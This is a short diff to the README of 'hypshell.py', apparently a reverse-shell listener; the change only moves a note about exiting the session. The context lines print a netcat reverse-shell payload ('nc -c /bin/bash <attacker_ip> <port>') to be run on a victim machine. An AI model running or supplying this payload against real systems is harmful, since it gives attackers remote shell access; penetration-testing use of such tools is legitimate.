@@ -8,9 +8,9 @@ You can run the script on the attacking machine to listen for incoming connectio
 Run this payload on the victim to start a reverse shell:
 `nc -c /bin/bash <attacker_ip> <port>`
 
-**NOTE: To exit the program you have to enter "exit" in the shell session even if you can't read the input**
-
 To make the script executable you can run: `chmod +x hypshell.py`
+
+**NOTE: To exit the program you have to enter "exit" in the shell session even if you can't read the input**
 ## Options
 ```
 usage: ./hypshell.py [options] port
